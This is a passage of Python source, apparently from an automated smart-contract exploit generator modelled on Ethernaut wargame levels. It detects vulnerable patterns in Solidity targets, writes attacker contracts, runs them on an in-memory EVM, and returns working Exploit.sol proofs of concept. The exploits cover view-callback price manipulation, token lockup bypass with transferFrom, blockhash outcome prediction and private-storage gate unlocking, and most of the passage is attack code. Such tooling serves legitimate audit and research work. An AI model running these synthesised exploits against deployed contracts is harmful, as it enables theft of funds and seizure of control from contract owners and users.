        iname, ibody = im.group(1), im.group(2)
        fm = re.search(r"function\s+(\w+)\s*\(\s*\)[^;]*\breturns\s*\(\s*(?:uint\d*)", ibody)
        if fm:
            cand.append((iname, fm.group(1)))
    for iname, mname in cand:
        if not re.search(re.escape(iname) + r"\s*\(\s*msg\.sender\s*\)", tb):
            continue
        f = None; flagvar = None; pricevar = None
        for fn in _functions(tb):
            b = fn["body"]
            if re.search(re.escape(iname) + r"\s*\(\s*msg\.sender\s*\)", b) \
                    and len(re.findall(r"\.\s*" + re.escape(mname) + r"\s*\(", b)) >= 2:
                pm = re.search(r"(\w+)\s*=\s*[\w.]*\.\s*" + re.escape(mname) + r"\s*\(", b)
                fm2 = re.search(r"(\w+)\s*=\s*true", b)
                if pm:
                    f = fn["name"]; pricevar = pm.group(1); flagvar = fm2.group(1) if fm2 else None
                    break
        if not f or not pricevar:
            continue
        _solcv, _evm = _solc_for(target_src)
        # 컴파일해 타깃 ABI/게터 확인
        std0 = {"language":"Solidity","sources":{f"{name}.sol":{"content":target_src}},
                "settings":{"evmVersion":_evm,"outputSelection":{"*":{"*":["abi"]}}}}
        try: c0 = solcx.compile_standard(std0, allow_empty=True)
        except Exception: return None
        tabi = None
        for _fl, cs in c0.get("contracts", {}).items():
            for cn, c in cs.items():
                if cn == name: tabi = c["abi"]
        if tabi is None or not _has_getter(tabi, pricevar):
            continue
        gate = flagvar if (flagvar and _has_getter(tabi, flagvar)) else None
        cond = (f"IS(shop).{gate}() ? 1 : 100") if gate else "sold ? 1 : 100"
        pwn_src = (HEADER +
            f"interface IS {{ function {f}() external; function {pricevar}() external view returns (uint256);"
            + (f" function {gate}() external view returns (bool);" if gate else "") + " }\n"
            "contract Pwn {\n"
            "    address shop; bool sold;\n"
            f"    function run(address t) external {{ shop = t; IS(t).{f}(); }}\n"
            f"    function {mname}() external view returns (uint256) {{ return {cond}; }}\n"
            "}\n")
        std = {"language":"Solidity","sources":{f"{name}.sol":{"content":target_src},"Pwn.sol":{"content":pwn_src}},
               "settings":{"evmVersion":_evm,"outputSelection":{"*":{"*":["abi","evm.bytecode.object"]}}}}
        try: compiled = solcx.compile_standard(std, allow_empty=True)
        except Exception: continue
        arts = {}
        for _fl, cs in compiled.get("contracts", {}).items():
            for cn, c in cs.items():
                arts[cn] = {"abi": c["abi"], "bin": c["evm"]["bytecode"]["object"]}
        if name not in arts or "Pwn" not in arts:
            continue
        abi = arts[name]["abi"]
        w3, acct = _mk_evm()
        def deploy(cn, args):
            C = w3.eth.contract(abi=arts[cn]["abi"], bytecode=arts[cn]["bin"])
            return w3.eth.wait_for_transaction_receipt(
                C.constructor(*args).transact({"from":acct,"gas":6_000_000})).contractAddress
        try:
            taddr = deploy(name, [_default_for_type(t) for t in _abi_ctor_types(abi)])
            paddr = deploy("Pwn", [])
        except Exception:
            continue
        tc = w3.eth.contract(address=taddr, abi=abi)
        try: p0 = int(tc.functions[pricevar]().call())
        except Exception: continue
        pwn = w3.eth.contract(address=paddr, abi=arts["Pwn"]["abi"])
        try:
            pwn.functions.run(taddr).transact({"from":acct,"gas":3_000_000})
        except Exception:
            continue
        try: p1 = int(tc.functions[pricevar]().call())
        except Exception: continue
        if not (p1 < p0):
            continue
        poc = (HEADER +
            "// Strategy: view-callback inconsistency (Ethernaut Shop). buy() reads price()\n"
            "// twice; the attacker returns a high price on the gating read and a low price\n"
            "// on the committing read (by reading the shop's own state).\n"
            f"interface IS {{ function {f}() external; function {(gate or pricevar)}() external view returns ({'bool' if gate else 'uint256'}); }}\n"
            "contract Exploit {\n"
            "    address shop;\n"
            f"    function run(address t) external {{ shop = t; IS(t).{f}(); }}\n"
            f"    function {mname}() external view returns (uint256) {{ return {cond}; }}\n"
            "}\n")
        gen = {"step":"generate","title":"Exploit.sol 생성 (shop)","strategy":"shop","exploit_src":poc}
        return {"name":name,"proven":True,"firstViolated":f"'{pricevar}' manipulated via view-callback ({p0}→{p1})",
                "strategy":f"shop:{f}","steps":[scan_step,gen],"exploit_src":poc,"mode":"effect",
                "note":"view 콜백을 두 번 신뢰하는 분기를 조작해 상태(price)를 불가능한 값으로 낮췄습니다.",
                "ms":int((time.time()-t0)*1000)}
    return None


def _synth_lockup_bypass(name, target_src, invariants_src, manifest, scan_step, t0):
    """Ethernaut Naught Coin 류: transfer() 는 락업(modifier/require)인데 transferFrom() 은
    무방비인 ERC20. 소유자(player)가 approve+transferFrom 으로 락업을 우회해 전량 이전한다.
    직접 transfer 는 revert 하지만 transferFrom 은 성립해 잔액이 0 이 되는지로 증명."""
    import solcx
    from web3 import Web3
    strip = _strip_comments(target_src)
    bodies = _contract_bodies(strip)
    if name not in bodies:
        return None
    tb = bodies[name]
    fns = {fn["name"]: fn for fn in _functions(tb)}
    if not ({"transfer","transferFrom","approve","balanceOf"} & set(fns.keys()) or "balanceOf" in tb):
        return None
    if "transfer" not in fns or "transferFrom" not in fns:
        return None
    thead = fns["transfer"]["head"] + fns["transfer"]["body"]
    fhead = fns["transferFrom"]["head"] + fns["transferFrom"]["body"]
    locked_transfer = bool(re.search(r"lock|timeLock|block\.timestamp|require\([^)]*time", thead, re.I)) \
        or bool(re.search(r"\b(lockTokens|onlyAfter|whenUnlocked)\b", fns["transfer"]["head"]))
    locked_ff = bool(re.search(r"lock|timeLock|block\.timestamp|require\([^)]*time", fhead, re.I)) \
        or bool(re.search(r"\b(lockTokens|onlyAfter|whenUnlocked)\b", fns["transferFrom"]["head"]))
    if not (locked_transfer and not locked_ff):
        return None
    _solcv, _evm = _solc_for(target_src)
    std = {"language":"Solidity","sources":{f"{name}.sol":{"content":target_src}},
           "settings":{"evmVersion":_evm,"outputSelection":{"*":{"*":["abi","evm.bytecode.object"]}}}}
    try: compiled = solcx.compile_standard(std, allow_empty=True)
    except Exception: return None
    arts = {}
    for _fl, cs in compiled.get("contracts", {}).items():
        for cn, c in cs.items():
            arts[cn] = {"abi": c["abi"], "bin": c["evm"]["bytecode"]["object"]}
    if name not in arts:
        return None
    abi = arts[name]["abi"]
    w3, acct = _mk_evm()
    accts = list(w3.eth.accounts)
    # player 를 attacker(acct) 로 배포(생성자 address 인자에 acct 주입)
    ctypes = _abi_ctor_types(abi)
    cargs = [Web3.to_checksum_address(acct) if t == "address" else _default_for_type(t) for t in ctypes]
    def deploy(cn, args):
        C = w3.eth.contract(abi=arts[cn]["abi"], bytecode=arts[cn]["bin"])
        return w3.eth.wait_for_transaction_receipt(
            C.constructor(*args).transact({"from":acct,"gas":6_000_000})).contractAddress
    try:
        taddr = deploy(name, cargs)
    except Exception:
        return None
    tc = w3.eth.contract(address=taddr, abi=abi)
    try:
        bal0 = int(tc.functions.balanceOf(acct).call())
    except Exception:
        return None
    if bal0 <= 0:
        return None
    def _ok(txh):
        try: return int(w3.eth.wait_for_transaction_receipt(txh).status) == 1
        except Exception: return False
    # 직접 transfer 는 락업으로 실패해야(정탐 조건)
    direct_blocked = not _ok(tc.functions.transfer(accts[-1], bal0).transact({"from":acct,"gas":200000}))
    if not direct_blocked:
        return None
    # approve + transferFrom 으로 우회 이전
    try:
        tc.functions.approve(acct, bal0).transact({"from":acct,"gas":200000})
        moved = _ok(tc.functions.transferFrom(acct, accts[-1], bal0).transact({"from":acct,"gas":300000}))
    except Exception:
        return None
    if not moved or int(tc.functions.balanceOf(acct).call()) != 0:
        return None
    poc = (HEADER +
        "// Strategy: lockup bypass (Ethernaut Naught Coin). transfer() is time-locked for\n"
        "// the player, but transferFrom() is not — approve() then transferFrom() moves the\n"
        "// full balance out, bypassing the lock.\n"
        "interface IT {\n"
        "    function balanceOf(address) external view returns (uint256);\n"
        "    function approve(address,uint256) external returns (bool);\n"
        "    function transferFrom(address,address,uint256) external returns (bool);\n"
        "}\n"
        "contract Exploit {\n"
        "    function run(address t) external payable {\n"
        "        uint256 bal = IT(t).balanceOf(msg.sender);\n"
        "        // player calls: IT(t).approve(address(this), bal); then this pulls it out\n"
        "        IT(t).transferFrom(msg.sender, address(0xdead), bal);\n"
        "    }\n}\n")
    gen = {"step":"generate","title":"Exploit.sol 생성 (lockup-bypass)","strategy":"lockup-bypass","exploit_src":poc}
    return {"name":name,"proven":True,"firstViolated":"transfer lockup bypassed via transferFrom (balance → 0)",
            "strategy":"lockup-bypass:transferFrom","steps":[scan_step,gen],"exploit_src":poc,"mode":"effect",
            "note":"transfer 는 락업이지만 transferFrom 이 무방비라 approve+transferFrom 으로 전량 이전했습니다.",
            "ms":int((time.time()-t0)*1000)}


def _multiblock_attempt(name, target_src, invariants_src, manifest, scan_step, t0):
    """다중 블록 러너: 블록 엔트로피로 결과가 정해지는 게임(예: CoinFlip)에서,
    소스의 결과식을 복제한 공격 컨트랙트를 배포하고 블록을 넘기며 매 블록 올바른
    값으로 호출해 승리 카운터를 임계까지 올린다."""
    import solcx
    from web3 import Web3
    src = _strip_comments(target_src)
    if not re.search(r"blockhash|block\.(number|timestamp|prevrandao|difficulty)", src):
        return None
    bodies = _contract_bodies(src)
    if name not in bodies:
        return None
    tb = bodies[name]
    # 대상 함수: 단일 (bool|uint) 인자 + 본문에서 그 인자와 비교
    target_fn = None; guess = None; gtype = None
    for f in _functions(tb):
        if len(f["args"]) != 1: continue
        gt, gn = f["args"][0]
        if not (gt == "bool" or gt.startswith("uint")): continue
        if re.search(r"block|blockhash", f["body"]) and re.search(re.escape(gn), f["body"]):
            target_fn, guess, gtype = f, gn, ("bool" if gt=="bool" else "uint256"); break
    if not target_fn:
        return None
    b = target_fn["body"]
    mcmp = re.search(r"(\w+)\s*==\s*" + re.escape(guess) + r"\b", b) or \
           re.search(re.escape(guess) + r"\s*==\s*(\w+)", b)
    if not mcmp:
        return None
    answer = mcmp.group(1).strip()
    # 로컬 정의 + 상태 상수(리터럴 초기화, 재대입 없음) 인라인
    local = dict(re.findall(r"(?:uint\d*|bool|bytes32|address)\s+(\w+)\s*=\s*([^;]+);", b))
    consts = {}
    for cm2 in re.finditer(r"(?:uint\d*|bytes32)\s+(?:public\s+|private\s+|internal\s+)?(?:constant\s+|immutable\s+)?(\w+)\s*=\s*([^;]+);", tb):
        vn, ve = cm2.group(1), cm2.group(2).strip()
        if not re.search(r"\b" + re.escape(vn) + r"\s*=", b) and re.fullmatch(r"[0-9a-fx]+", ve.replace(" ","")):
            consts[vn] = ve
    subs = dict(local); subs.update(consts)
    allowed = re.compile(r"^[\s0-9x_a-fA-F()+\-*/%.?:!=<>]|block|blockhash|uint256|uint|keccak256|abi|bytes32|true|false|prevrandao|timestamp|number|difficulty|encodePacked")
    expr = answer
    for _ in range(12):
        ids = set(re.findall(r"[A-Za-z_]\w*", expr))
        prog = False
        for idn in ids:
            if idn in subs:
                expr = re.sub(r"\b"+re.escape(idn)+r"\b", "("+subs[idn]+")", expr); prog = True
        if not prog: break
    leftover = [i for i in re.findall(r"[A-Za-z_]\w*", expr)
                if i not in ("block","blockhash","uint256","uint","keccak256","abi","bytes32",
                             "true","false","prevrandao","timestamp","number","difficulty","encodePacked")]
    extra_getters = []
    if leftover:
        try:
            from trust404.layout import rewrite_mixed, leftover_ids
            expr, extra_getters = rewrite_mixed(expr, tb, obj="t")
            leftover = leftover_ids(expr)
        except Exception:
            leftover = leftover
        if leftover:
            return None  # still not reducible
    _solcv, _evm = _solc_for(target_src)
    std = {"language":"Solidity","sources":{f"{name}.sol":{"content":target_src}},
           "settings":{"evmVersion":_evm,"outputSelection":{"*":{"*":["abi","evm.bytecode.object"]}}}}
    try: compiled = solcx.compile_standard(std, allow_empty=True)
    except Exception: return None
    art = None
    for _f, cs in compiled.get("contracts", {}).items():
        for cn, c in cs.items():
            if cn == name: art = {"abi":c["abi"],"bin":c["evm"]["bytecode"]["object"]}
    if not art: return None
    abi = art["abi"]
    counters = [e["name"] for e in abi if e.get("type")=="function" and not e.get("inputs")
                and e.get("stateMutability") in ("view","pure")
                and len(e.get("outputs",[]))==1 and e["outputs"][0]["type"].startswith("uint")]
    fn = target_fn["name"]
    gexpr = expr if gtype != "bool" else "(" + expr + ")"
    getter_ifaces = "".join(
        f" function {g}() external view returns (uint256);" for g in extra_getters)
    attacker = (HEADER +
        f"interface ITarget {{ function {fn}({gtype}) external;{getter_ifaces} }}\n"
        "contract Attacker {\n"
        "    ITarget t;\n"
        "    constructor(address _t) { t = ITarget(_t); }\n"
        "    function step() external {\n"
        f"        {gtype} g = {gexpr};\n"
        f"        t.{fn}(g);\n"
        "    }\n"
        "}\n")
    astd = {"language":"Solidity","sources":{"Attacker.sol":{"content":attacker},f"{name}.sol":{"content":target_src}},
            "settings":{"evmVersion":_evm,"outputSelection":{"*":{"*":["abi","evm.bytecode.object"]}}}}
    try: acomp = solcx.compile_standard(astd, allow_empty=True)
    except Exception: return None
    aart = None
    for _f, cs in acomp.get("contracts", {}).items():
        for cn, c in cs.items():
            if cn == "Attacker": aart = {"abi":c["abi"],"bin":c["evm"]["bytecode"]["object"]}
    if not aart: return None
    w3, acct = _mk_evm()
    accts = list(w3.eth.accounts); deployer = accts[1] if len(accts)>1 else acct
    tester = w3.provider.ethereum_tester
    try:
        dep = manifest.get("deploy", {}); cargs = _coerce_args(dep.get("constructor_args", []), Web3)
        C = w3.eth.contract(abi=abi, bytecode=art["bin"])
        seed = DEFAULT_SEED_WEI if _ctor_payable(abi) else 0
        taddr = w3.eth.wait_for_transaction_receipt(
            C.constructor(*cargs).transact({"from":deployer,"value":seed,"gas":12_000_000})).contractAddress
        AC = w3.eth.contract(abi=aart["abi"], bytecode=aart["bin"])
        aaddr = w3.eth.wait_for_transaction_receipt(
            AC.constructor(taddr).transact({"from":acct,"gas":12_000_000})).contractAddress
        att = w3.eth.contract(address=aaddr, abi=aart["abi"])
    except Exception:
        return None
    tc = w3.eth.contract(address=taddr, abi=abi)
    c0 = {c: tc.functions[c]().call() for c in counters}
    wins = 0
    for _i in range(15):
        try: tester.mine_block()
        except Exception: pass
        try:
            att.functions.step().transact({"from":acct,"gas":2_000_000}); wins += 1
        except Exception:
            pass
        if any(tc.functions[c]().call() >= 10 for c in counters):
            poc = attacker + ("\n// 사용: Attacker 를 배포한 뒤 서로 다른 블록에서 step() 을 10회+\n"
                              "// 호출한다(각 블록 blockhash 로 결과를 미리 계산해 항상 승리).\n")
            gen = {"step":"generate","title":"Exploit.sol 생성 (multi-block)","strategy":"multiblock","exploit_src":poc}
            hitc = next(c for c in counters if tc.functions[c]().call() >= 10)
            return {"name":name,"proven":True,"firstViolated":f"predictable outcome — {hitc} reached {tc.functions[hitc]().call()}",
                    "strategy":f"multiblock:{fn}","steps":[scan_step,gen],"exploit_src":poc,"mode":"effect",
                    "note":"블록 엔트로피 결과식을 복제해 다중 블록에 걸쳐 연속 예측했습니다.",
                    "ms":int((time.time()-t0)*1000)}
    return None


def _storage_attempt(name, target_src, invariants_src, manifest, scan_step, t0):
    """스토리지 보조 익스플로잇: private 변수를 게이트로 쓰는 함수(예: Vault.unlock
    (bytes32))에 대해, 배포된 타깃의 스토리지 슬롯을 오프체인으로 읽어(값이 곧 비밀)
    그 값으로 호출한다. 효과는 자금/권한 외에 '상태 플래그(bool) 반전'도 본다."""
    import solcx
    from web3 import Web3
    _solcv, _evm = _solc_for(target_src)
    std = {"language":"Solidity","sources":{f"{name}.sol":{"content":target_src}},
           "settings":{"evmVersion":_evm,"outputSelection":{"*":{"*":["abi","evm.bytecode.object"]}}}}
    try:
        compiled = solcx.compile_standard(std, allow_empty=True)
    except Exception:
        return None
    arts = {}
    for _f, cs in compiled.get("contracts", {}).items():
        for cn, c in cs.items():
            arts[cn] = {"abi": c["abi"], "bin": c["evm"]["bytecode"]["object"]}
    if name not in arts:
        return None
    abi = arts[name]["abi"]
    # 단일 인자(bytes32/uint256/address) 게이트 함수가 없으면 스킵
    def _gate_type(t):
        return t in ("uint256", "address") or bool(re.fullmatch(r"bytes\d+", t))
    gate_fns = [e for e in abi if e.get("type")=="function"
                and e.get("stateMutability") not in ("view","pure")
                and len(e.get("inputs",[]))==1
                and _gate_type(e["inputs"][0]["type"])]
    if not gate_fns:
        return None
    bool_getters = [e["name"] for e in abi if e.get("type")=="function" and not e.get("inputs")
                    and e.get("stateMutability") in ("view","pure")
                    and len(e.get("outputs",[]))==1 and e["outputs"][0]["type"]=="bool"]
    w3, acct = _mk_evm()
    accts = list(w3.eth.accounts); deployer = accts[1] if len(accts)>1 else acct
    dep = manifest.get("deploy", {}); cargs = _coerce_args(dep.get("constructor_args", []), Web3)
    seed_wei = int(str(dep.get("value_wei", str(DEFAULT_SEED_WEI))) or "0")
    if not _ctor_payable(abi):
        seed_wei = 0
    C = w3.eth.contract(abi=abi, bytecode=arts[name]["bin"])
    try:
        tx = C.constructor(*cargs).transact({"from":deployer,"value":seed_wei,"gas":12_000_000})
        taddr = w3.eth.wait_for_transaction_receipt(tx).contractAddress
    except Exception:
        try:
            tx = C.constructor(*cargs).transact({"from":deployer,"gas":12_000_000}); seed_wei = 0
            taddr = w3.eth.wait_for_transaction_receipt(tx).contractAddress
        except Exception:
            return None
    if taddr is None:
        return None
    if seed_wei == 0:  # 피해자 자금 흉내
        try: w3.eth.send_transaction({"from":accts[-1],"to":taddr,"value":DEFAULT_SEED_WEI,"gas":200_000})
        except Exception: pass
    tc = w3.eth.contract(address=taddr, abi=abi)
    inv = None
    if invariants_src:
        try:
            istd = {"language":"Solidity","sources":{"Invariants_src.sol":{"content":invariants_src}},
                    "settings":{"evmVersion":_evm,"outputSelection":{"*":{"*":["abi","evm.bytecode.object"]}}}}
            ic = solcx.compile_standard(istd, allow_empty=True)
            iname = infer_invariants_name(invariants_src) or "Invariants"
            ia = None
            for _f, cs in ic.get("contracts", {}).items():
                for cn, c in cs.items():
                    if cn == iname: ia = {"abi": c["abi"], "bin": c["evm"]["bytecode"]["object"]}
            if ia:
                itx = w3.eth.contract(abi=ia["abi"], bytecode=ia["bin"]).constructor().transact({"from":deployer,"gas":9_000_000})
                iaddr = w3.eth.wait_for_transaction_receipt(itx).contractAddress
                inv = w3.eth.contract(address=iaddr, abi=ia["abi"])
        except Exception:
            inv = None
    if inv is not None:  # 배포 직후 이미 위반이면 우리 호출로 귀인 불가 → 스킵
        try:
            if inv.functions.checkAll(taddr).call()[0] is not True:
                return None
        except Exception:
            return None
    flags0 = {g: tc.functions[g]().call() for g in bool_getters}
    # 후보값: 스토리지 슬롯 0..7 + 생성자 인자
    slots = []
    for i in range(8):
        try: slots.append(w3.eth.get_storage_at(taddr, i))
        except Exception: break
    tester = w3.provider.ethereum_tester; snap = tester.take_snapshot()
    def tripped():
        if inv is not None:
            r = inv.functions.checkAll(taddr).call()
            if r[0] is False: return "invariant:" + r[1]
        for g in bool_getters:
            if tc.functions[g]().call() != flags0[g]:
                return f"state flag '{g}' flipped"
        return None
    for fn in gate_fns:
        typ = fn["inputs"][0]["type"]; nm = fn["name"]
        nbytes = int(typ[5:]) if typ.startswith("bytes") else 0
        cand = []
        for s in slots:
            if typ.startswith("bytes"): cand.append(bytes(s[:nbytes]))   # 슬롯의 앞 N바이트(예: bytes16)
            elif typ == "uint256": cand.append(int.from_bytes(s, "big"))
            elif typ == "address": cand.append(Web3.to_checksum_address("0x"+s.hex()[-40:]))
        for a in cargs:  # 우리가 배포에 쓴 값(자체 배포이므로 알고 있음)
            if typ.startswith("bytes") and isinstance(a, (bytes, bytearray)): cand.append(bytes(a[:nbytes]))
            if typ == "uint256" and isinstance(a, int): cand.append(a)
            if typ == "address" and isinstance(a, str) and a.startswith("0x"): cand.append(a)
        for v in cand:
            tester.revert_to_snapshot(snap)
            try:
                tc.functions[nm](v).transact({"from":acct,"gas":3_000_000})
            except Exception:
                continue
            why = tripped()
            if why:
                if typ.startswith("bytes"):
                    lit = f"{typ}(0x" + (v.hex() if isinstance(v,(bytes,bytearray)) else "%x" % v) + ")"
                elif typ == "address":
                    lit = f"address({v})"
                else:
                    lit = str(v)
                poc = (HEADER +
                    "// Strategy: storage-assisted — a private variable gates this function.\n"
                    "// The value is read off-chain from the target's storage slot (e.g. via\n"
                    "// eth_getStorageAt / Foundry vm.load) and submitted here.\n"
                    "interface ITarget { function " + nm + "(" + typ + ") external; }\n"
                    "contract Exploit {\n"
                    "    function run(address t) external payable {\n"
                    f"        ITarget(t).{nm}({lit});\n"
                    "    }\n"
                    "    receive() external payable {}\n"
                    "}\n")
                gen = {"step":"generate","title":"Exploit.sol 생성 (storage-assisted)","strategy":"storage","exploit_src":poc}
                return {"name":name,"proven":True,"firstViolated":why,"strategy":f"storage:{nm}",
                        "steps":[scan_step,gen],"exploit_src":poc,"mode":"effect",
                        "note":"private 스토리지 값을 오프체인으로 읽어 게이트를 통과했습니다.",
                        "ms":int((time.time()-t0)*1000)}
    return None


def _normalize_synth_steps(res):
    """synth 경로는 실제로 in-memory EVM 에서 타깃/공격 컨트랙트를 배포하고 실행해
    효과(owner 탈취·자금 유출 등)를 관찰하지만, 결과 steps 에는 [scan, generate] 두
    줄만 담아 반환한다. 그러면 라이브 콘솔의 고정 5단 파이프라인이 '타깃 배포',
    'Exploit 실행', '재검사' 를 데이터 없음 → skip 으로, scan 을 전략 없음 → '패턴 없음'
    으로 그린다(성립했는데도). 여기서 성립한 결과의 steps 를 실제 수행에 맞게 채운다."""
    if not isinstance(res, dict) or not res.get("proven"):
        return res
    steps = res.get("steps")
    if not isinstance(steps, list):
        return res
    have = {s.get("step") for s in steps if isinstance(s, dict)}
    strat = res.get("strategy")
    fv = res.get("firstViolated") or ""
    deployed = list(_DEPLOY_LEDGER)   # 이번 실행에서 실제 배포된 컨트랙트 주소들
    # 1) scan 스텝에 성립 전략 주입 → '패턴 없음' 대신 선택된 전략 표시
    for s in steps:
        if isinstance(s, dict) and s.get("step") == "scan" and not s.get("strategy"):
            s["strategy"] = strat
    # 이미 deploy_target 스텝이 있는데 주소가 없으면 원장 주소를 채운다
    for s in steps:
        if isinstance(s, dict) and s.get("step") == "deploy_target" and not s.get("address") and not s.get("addresses") and deployed:
            s["addresses"] = deployed
    # 2) 타깃 배포 스텝(실제로 in-memory EVM 에 배포함) — 배포된 주소를 모두 표시
    if "deploy_target" not in have:
        dt = {"step":"deploy_target"}
        if deployed:
            dt["title"] = f"컨트랙트 {len(deployed)}개 배포 (in-memory EVM)"
            dt["addresses"] = deployed
            dt["address"] = deployed[0]
        else:
            dt["title"] = "타깃 배포 + 건강 검사 (in-memory EVM)"
            dt["balance_wei"] = str(res.get("balance_before_wei") or "0")
        steps.append(dt)
    # 3) Exploit 배포 + 실행 스텝(합성한 공격 컨트랙트를 실제로 실행함)
    if "run_exploit" not in have:
        rx = {"step":"run_exploit","title":"Exploit 배포 + 실행",
              "firstViolated": fv,
              "balance_before_wei": res.get("balance_before_wei"),
              "balance_after_wei": res.get("balance_after_wei")}
        # 배포가 2개 이상이면 마지막을 공격 컨트랙트로 표기(대개 타깃 다음 공격 컨트랙트 배포)
        if len(deployed) >= 2:
            rx["exploit_address"] = deployed[-1]
        steps.append(rx)
    # 4) 효과 관찰 스텝(불변식 미제공 effect 모드는 자동 합성 술어 위반을 관찰) → skip 방지
    if "verify" not in have:
        steps.append({"step":"verify","title":"효과 관찰 (자동 합성 술어)",
                      "checkAll_after": {"allHold": False, "firstViolated": fv},
                      "balance_wei": str(res.get("balance_after_wei") or "0")})
    return res


def _fuzz_fallback(name, target_src, invariants_src, manifest, do_verify, scan_step, t0):
    res = _fuzz_fallback_impl(name, target_src, invariants_src, manifest, do_verify, scan_step, t0)
    return _normalize_synth_steps(res)


def _fuzz_fallback_impl(name, target_src, invariants_src, manifest, do_verify, scan_step, t0):
    # 0) 재진입 합성: 소스에서 유도한 (예치→인출) 공격 컨트랙트를 하네스로 검증
    try:
        for label, ex in _synth_reentrancy(target_src):
            try:
                if do_verify and invariants_src:
                    proven, vsteps, meta = _verify_attempt(name, target_src, invariants_src, ex, manifest)
                else:
                    proven, vsteps, meta = _run_effect(name, target_src, ex, manifest)
            except Exception:
                continue
            if proven:
                gen = {"step":"generate","title":"Exploit.sol 생성 (reentrancy-fuzz)","strategy":label,"exploit_src":ex}
                return {"name":name,"proven":True,"firstViolated":meta.get("firstViolated",""),
                        "strategy":label,"steps":[scan_step,gen]+vsteps,"exploit_src":ex,
                        "mode":("verify" if (do_verify and invariants_src) else "effect"),
                        "balance_before_wei":meta.get("balance_before_wei"),
                        "balance_after_wei":meta.get("balance_after_wei"),
                        "note":"템플릿 미매치 → 퍼저가 재진입 공격을 합성해 성립시켰습니다.",
                        "ms":int((time.time()-t0)*1000)}
    except Exception:
        pass
    # 0b) 다중 컨트랙트 AMM 가격 조작(플래시론식) 합성
    try:
        for label, ex in _synth_amm(target_src, name):
            try:
                if do_verify and invariants_src:
                    proven, vsteps, meta = _verify_attempt(name, target_src, invariants_src, ex, manifest)
                else:
                    proven, vsteps, meta = _run_effect(name, target_src, ex, manifest)
            except Exception:
                continue
            if proven:
                gen = {"step":"generate","title":"Exploit.sol 생성 (amm-manip)","strategy":label,"exploit_src":ex}
                return {"name":name,"proven":True,"firstViolated":meta.get("firstViolated",""),
                        "strategy":label,"steps":[scan_step,gen]+vsteps,"exploit_src":ex,
                        "mode":("verify" if (do_verify and invariants_src) else "effect"),
                        "balance_before_wei":meta.get("balance_before_wei"),
                        "balance_after_wei":meta.get("balance_after_wei"),
                        "note":"템플릿 미매치 → 다중 컨트랙트 AMM 조작(플래시론식)을 합성해 성립시켰습니다.",
                        "ms":int((time.time()-t0)*1000)}
    except Exception:
        pass
    # 0c) 플래시론 차용자 합성 (잔액-게이트 특권 함수)
    try:
        for label, ex in _synth_flashloan(target_src, name):
            try:
                if do_verify and invariants_src:
                    proven, vsteps, meta = _verify_attempt(name, target_src, invariants_src, ex, manifest)
                else:
                    proven, vsteps, meta = _run_effect(name, target_src, ex, manifest)
            except Exception:
                continue
            if proven:
                gen = {"step":"generate","title":"Exploit.sol 생성 (flashloan)","strategy":label,"exploit_src":ex}
                return {"name":name,"proven":True,"firstViolated":meta.get("firstViolated",""),
                        "strategy":label,"steps":[scan_step,gen]+vsteps,"exploit_src":ex,
                        "mode":("verify" if (do_verify and invariants_src) else "effect"),
                        "balance_before_wei":meta.get("balance_before_wei"),
                        "balance_after_wei":meta.get("balance_after_wei"),
                        "note":"템플릿 미매치 → 시스템 내부 플래시론을 이용한 차용자를 합성해 성립시켰습니다.",
                        "ms":int((time.time()-t0)*1000)}
    except Exception:
        pass
    # 0d) 스토리지 보조 익스플로잇 (private 게이트 — 예: Vault.unlock)
    try:
        r = _storage_attempt(name, target_src, invariants_src, manifest, scan_step, t0)
        if r:
            return r
    except Exception:
        pass
    # 0e) 2-컨트랙트 배선 + 프록시 calldata (예: Delegation)
    try:
        r = _proxy_attempt(name, target_src, invariants_src, manifest, scan_step, t0)
        if r:
            return r
    except Exception:
        pass
    # 0f) 다중 블록 러너 (예: CoinFlip / Predict the Future)
    try:
        r = _multiblock_attempt(name, target_src, invariants_src, manifest, scan_step, t0)
        if r:
            return r
    except Exception:
        pass
    # 0g) delegatecall 스토리지 충돌 2단계 (예: Preservation)
    try:
        r = _synth_storage_collision(name, target_src, invariants_src, manifest, scan_step, t0)
        if r:
            return r
    except Exception:
        pass
    # 0h) 그리핑 DoS (예: King — revert-receive 로 특권 역할 영구 락)
    try:
        r = _synth_king_dos(name, target_src, invariants_src, manifest, scan_step, t0)
        if r:
            return r
    except Exception:
        pass
    # 0i) 콜백 반환 불일치 (예: Elevator — 외부 콜백 두 번 신뢰)
    try:
        r = _synth_callback_inconsistency(name, target_src, invariants_src, manifest, scan_step, t0)
        if r:
            return r
    except Exception:
        pass
    # 0j) view 콜백 불일치 (예: Shop — price() 두 번 신뢰)
    try:
        r = _synth_shop(name, target_src, invariants_src, manifest, scan_step, t0)
        if r:
            return r
    except Exception:
        pass
    # 0k) 락업 우회 (예: Naught Coin — transfer 락업, transferFrom 무방비)
    try:
        r = _synth_lockup_bypass(name, target_src, invariants_src, manifest, scan_step, t0)
        if r:
            return r
    except Exception:
        pass
    # 0l) 가스 그리핑 DoS (예: Denial — 수신자 콜백 가스 소진)
    try:
        r = _synth_gas_griefing(name, target_src, invariants_src, manifest, scan_step, t0)
        if r:
            return r
    except Exception:
        pass
    # 0m) 강제 ETH 주입 (예: Force — receive 없는 inert 컨트랙트)
    try:
        r = _synth_force(name, target_src, invariants_src, manifest, scan_step, t0)
        if r:
            return r
    except Exception:
        pass
    # 0n) Gatekeeper Two (생성자 호출 + XOR 키)
    try:
        r = _synth_gatekeeper_two(name, target_src, invariants_src, manifest, scan_step, t0)
        if r:
            return r
    except Exception:
        pass
    # 0n2) Gatekeeper One (gasleft 브루트포스 + tx.origin 키)
    try:
        r = _synth_gatekeeper_one(name, target_src, invariants_src, manifest, scan_step, t0)
        if r:
            return r
    except Exception:
        pass
    # 0o) Magic Number (10바이트 런타임 solver)
    try:
        r = _synth_magicnumber(name, target_src, invariants_src, manifest, scan_step, t0)
        if r:
            return r
    except Exception:
        pass
    # 0p) HigherOrder (원시 calldata 로 uint8 초과 기록)
    try:
        r = _synth_higher_order(name, target_src, invariants_src, manifest, scan_step, t0)
        if r:
            return r
    except Exception:
        pass
    # 0q) Switch (calldata 오프셋 우회)
    try:
        r = _synth_switch(name, target_src, invariants_src, manifest, scan_step, t0)
        if r:
            return r
    except Exception:
        pass
    # 0r) Alien Codex (배열 length 언더플로 → 임의 스토리지 쓰기)
    try:
        r = _synth_array_underflow(name, target_src, invariants_src, manifest, scan_step, t0)
        if r:
            return r
    except Exception:
        pass
    # 0s) Dex Two (토큰 미검증 → 가짜 토큰 드레인) — Dex 보다 먼저(require 없는 변종)
    try:
        r = _synth_dex_two_drain(name, target_src, invariants_src, manifest, scan_step, t0)
        if r:
            return r
    except Exception:
        pass
